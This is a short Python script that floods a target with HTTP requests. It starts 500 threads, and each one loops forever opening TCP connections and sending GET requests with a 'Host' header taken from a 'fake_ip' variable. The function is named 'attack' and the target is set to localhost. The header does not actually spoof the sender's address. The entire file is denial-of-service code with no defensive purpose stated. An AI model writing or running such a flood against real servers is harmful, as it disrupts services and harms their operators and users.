import threading
import socket

target = '127.0.0.1'
port = 33001
fake_ip = '182.21.20.32'

def attack():
	already_connected = 0
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii') , (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii') , (target, port))
		s.close()
		
		
		# already_connected += 1
		# if(already_connected % 500) == 0:
			# print(already_connected)
		
for i in range(500):
	thread = threading.Thread(target=attack)
	thread.start()
